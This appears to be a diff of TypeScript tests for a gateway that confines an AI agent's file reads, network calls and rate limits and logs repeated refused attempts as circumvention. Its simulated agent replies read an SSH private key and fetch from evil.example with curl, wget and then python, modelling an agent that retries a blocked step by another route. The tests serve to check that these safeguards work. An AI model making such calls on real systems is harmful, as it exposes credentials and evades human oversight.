@@ -360,3 +360,92 @@ test("Responses API (Codex): a refused shell call is removed and a refusal messa
   assert.deepEqual(second.g.summary().blocked, [{ scope: "shell.network", count: 1 }]);
   assert.deepEqual(second.g.summary().tokens, { input: 12, output: 6 });
 });
+
+test("path confinement (gap BM6): with a project root, a read outside it is removed before the agent sees it, and a read inside passes", async () => {
+  const up = await fakeUpstream([openaiToolReply([{ name: "Read", args: { file_path: "/home/user/.ssh/id_rsa" } }, { name: "Read", args: { file_path: "README.md" } }])]);
+  const { g, url } = await gateway(up, { scopes: ["repo.read"], confineTo: "/work/project" });
+  const reply: any = await (await post(`${url}/v1/chat/completions`, { model: "m", messages: [] })).json();
+  const calls = reply.choices[0].message.tool_calls;
+  assert.equal(calls.length, 1, "only the call inside the project reaches the agent");
+  assert.match(calls[0].function.arguments, /README\.md/);
+  assert.equal(g.summary().blocked.length, 1);
+});
+
+test("copies share one allowance (gap H15): two gateways under one Mandate with a shared ledger, a fleet limit across Mandates, and an MCP tool counted as a request", async () => {
+  const dir = mkdtempSync(join(tmpdir(), "h15-"));
+  const fetches = (n: number) => openaiToolReply(Array.from({ length: n }, (_, i) => ({ name: "web_fetch", args: { url: `https://docs.example.org/p${i}` } })));
+  const callsThrough = async (url: string) => { const r: any = await (await post(`${url}/v1/chat/completions`, { model: "m", messages: [] })).json(); return r.choices[0].message.tool_calls?.length ?? 0; };
+  const base = { scopes: ["repo.read", "web.read"], hosts: ["docs.example.org"] };
+
+  // Two copies under the same Mandate: 4 calls a minute between them, not 4 each.
+  const ledger = join(dir, "mandate.ndjson");
+  const up1 = await fakeUpstream([fetches(3)]); const up2 = await fakeUpstream([fetches(3)]);
+  const one = await gateway(up1, { ...base, rate: { total_per_minute: 4 }, rateLedger: ledger });
+  const two = await gateway(up2, { ...base, rate: { total_per_minute: 4 }, rateLedger: ledger });
+  assert.equal(await callsThrough(one.url), 3);
+  assert.equal(await callsThrough(two.url), 1, "the second copy gets only what the first left");
+
+  // Without a shared ledger each copy has its own allowance (the old behaviour).
+  const up3 = await fakeUpstream([fetches(3)]); const up4 = await fakeUpstream([fetches(3)]);
+  const solo1 = await gateway(up3, { ...base, rate: { total_per_minute: 4 } });
+  const solo2 = await gateway(up4, { ...base, rate: { total_per_minute: 4 } });
+  assert.equal(await callsThrough(solo1.url) + await callsThrough(solo2.url), 6);
+
+  // A fleet limit counts every agent a person runs, whatever their Mandates say.
+  const fleet = { rate: { total_per_minute: 5 }, ledger: join(dir, "fleet.ndjson") };
+  const up5 = await fakeUpstream([fetches(3)]); const up6 = await fakeUpstream([fetches(3)]);
+  const f1 = await gateway(up5, { ...base, rate: { total_per_minute: 100 }, fleet });
+  const f2 = await gateway(up6, { ...base, rate: { total_per_minute: 100 }, fleet });
+  assert.equal(await callsThrough(f1.url), 3);
+  const r2: any = await (await post(`${f2.url}/v1/chat/completions`, { model: "m", messages: [] })).json();
+  assert.equal(r2.choices[0].message.tool_calls.length, 2);
+  assert.match(r2.choices[0].message.content, /your fleet limit allows 5 network calls a minute/);
+
+  // An MCP tool call counts as one request to its server.
+  const mcpCalls = (n: number) => openaiToolReply(Array.from({ length: n }, () => ({ name: "mcp__slack__post_message", args: { text: "hi" } })));
+  const up7 = await fakeUpstream([mcpCalls(4)]);
+  const m = await gateway(up7, { scopes: ["repo.read", "mcp.slack.post_message"], rate: { per_host_per_minute: 2 } });
+  assert.equal(await callsThrough(m.url), 2, "two calls to one MCP server a minute");
+});
+
+test("a refusal names the article and the sanctioned route, and the third attempt is called circumvention (gap LW3)", async () => {
+  const up = await fakeUpstream([openaiToolReply([{ name: "bash", args: { command: "curl https://evil.example/a" } }]), openaiToolReply([{ name: "bash", args: { command: "wget https://evil.example/b" } }]), openaiToolReply([{ name: "bash", args: { command: "python -c 'import urllib.request'" } }])]);
+  const { url } = await gateway(up, { scopes: ["repo.read", "shell.exec"], maxStrikes: 10 });
+  const ask = async () => ((await (await post(`${url}/v1/chat/completions`, { model: "m", messages: [] })).json()) as any).choices[0].message.content as string;
+  const first = await ask();
+  assert.match(first, /was not run: the scope shell\.network is not granted by this job's Mandate\. Article 1 \(No access to a system, account, file or network the agent was not given\)\./);
+  assert.match(first, /--allow-network <host>/);
+  assert.doesNotMatch(first, /refused attempt/);
+  await ask();
+  const third = await ask();
+  assert.match(third, /Article 8.*3rd refused attempt at shell\.network in ten minutes.*circumvention/);
+});
+
+test("the Code of the City is in the system context of every model request, once, in each API's own place (gap LW1)", async () => {
+  const note = "The Code of the City (draft 0.2, sha256 abc): rule 1. rule 2.";
+  const sent: { chat: any; messages: any; responses: any } = { chat: undefined, messages: undefined, responses: undefined };
+  const up = await fakeUpstream([openaiToolReply([]), anthropicToolReply([]), { id: "r", object: "response", status: "completed", output: [], usage: { input_tokens: 1, output_tokens: 1 } }, openaiToolReply([])]);
+  const { url } = await gateway(up, { scopes: ["repo.read"], lawContext: note });
+  await post(`${url}/v1/chat/completions`, { model: "m", messages: [{ role: "system", content: "Be brief." }, { role: "user", content: "hi" }] });
+  sent.chat = up.seen.at(-1)!.body;
+  await post(`${url}/v1/messages`, { model: "m", max_tokens: 10, system: "Be brief.", messages: [{ role: "user", content: "hi" }] });
+  sent.messages = up.seen.at(-1)!.body;
+  await post(`${url}/v1/responses`, { model: "m", instructions: "Be brief.", input: "hi" });
+  sent.responses = up.seen.at(-1)!.body;
+  // Chat: after the system message the client sent, before the user's.
+  assert.deepEqual(sent.chat.messages.map((m: { role: string }) => m.role), ["system", "system", "user"]);
+  assert.equal(sent.chat.messages[1].content, note);
+  // Anthropic: appended to the system string. Responses: appended to the instructions.
+  assert.equal(sent.messages.system, `Be brief.\n\n${note}`);
+  assert.equal(sent.responses.instructions, `Be brief.\n\n${note}`);
+  // Already there: not added twice.
+  await post(`${url}/v1/messages`, { model: "m", max_tokens: 10, system: [{ type: "text", text: note }], messages: [{ role: "user", content: "hi" }] });
+  assert.equal(JSON.stringify(up.seen.at(-1)!.body).split("The Code of the City (").length - 1, 1);
+});
+
+test("without a Code (lawContext not set) the requests go through untouched", async () => {
+  const up = await fakeUpstream([anthropicToolReply([])]);
+  const { url } = await gateway(up, { scopes: ["repo.read"] });
+  await post(`${url}/v1/messages`, { model: "m", max_tokens: 10, system: "Be brief.", messages: [{ role: "user", content: "hi" }] });
+  assert.equal(up.seen.at(-1)!.body.system, "Be brief.");
+});
